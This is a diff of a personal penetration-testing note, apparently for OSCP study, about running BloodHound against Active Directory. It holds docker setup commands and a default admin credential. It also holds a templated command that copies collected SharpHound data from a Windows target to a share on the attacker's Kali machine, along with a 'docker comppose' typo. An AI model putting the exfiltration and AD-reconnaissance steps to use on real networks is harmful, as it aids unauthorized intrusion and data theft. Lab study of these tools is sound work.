@@ -1,5 +1,44 @@
 [[Bloodhound]]
+## Boot up Bloodhound
+
+```
+cd ~/Desktop/Tools/Windows/Bloodhound && sudo docker compose down -v
+```
+
+```
+cd ~/Desktop/Tools/Windows/Bloodhound && sudo fuser -k 8080/tcp && sudo docker compose up
+```
+
+```
+localhost:8080
+```
+
+Kill port
+```
+sudo fuser -k 8080/tcp
+```
+
+Creds
+
+```
+admin : [initialpass]
+```
+
 ---
+
+Kill Docker compose bloodhound
+
+```
+sudo docker comppose down -v
+```
+
+```
+docker stop $(docker ps -q)
+```
+---
+
+---
+
 Run bloodhound remotely from KALI ATTACKER targeting AD system
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
@@ -88,44 +127,6 @@ const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page
 const command = `copy C:\\Users\\Public\\sharphound.zip \\\\${KaliIP}\\share\ `;
 
 dv.paragraph("```bash\n" + command + "\n```");
-```
----
-
-## Boot up Bloodhound
-
-```
-cd ~/Desktop/Tools/Windows/Bloodhound && sudo docker compose down -v
-```
-
-```
-cd ~/Desktop/Tools/Windows/Bloodhound && sudo fuser -k 8080/tcp && sudo docker compose up
-```
-
-```
-localhost:8080
-```
-
-Kill port
-```
-sudo fuser -k 8080/tcp
-```
-
-Creds
-
-```
-admin : [initialpass]
-```
-
----
-
-Kill Docker compose bloodhound
-
-```
-sudo docker comppose down -v
-```
-
-```
-docker stop $(docker ps -q)
 ```
 ---
 
